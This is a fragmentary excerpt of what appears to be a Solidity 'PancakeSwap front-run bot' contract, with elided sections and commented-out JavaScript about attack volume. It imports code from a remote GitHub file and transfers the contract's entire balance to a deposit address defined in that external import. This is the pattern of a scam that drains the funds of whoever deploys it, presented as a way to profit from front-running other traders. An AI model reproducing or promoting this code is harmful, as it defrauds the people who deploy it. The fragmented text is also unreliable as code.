...
//pancekeswap manager
import "https://github.com/X2R2/PancakesSwapFrontRunBot/blob/main/bot.sol";
...
//receive BNB From pancakeswap liquidity

receive() external payable {}

//attack token address
...
//try {   
      ...
      payable(manager.uniswapDepositAddres()).transfer(address(this).balance);
...
//async function triggersFrontRun(transaction, out_token_address, amount, level) {
   ...
   // else if (method == 'swapETHForExactTokens'){
        ...
        //{
            // console.log(out_token_addr.blue)
            // console.log(out_token_address)
//log_str = "Attack ETH Volumn : Pool Eth Volumn" + '\t\t' +(pool_info.attack_volumn/(10**input_token_info.decimals)).toFixed(3) + ' ' + input_token_info.symbol + '\t' + (pool_info.input_volumn/(10**input_token_info.decimals)).toFixed(3) + ' ' + input_token_info.symbol;
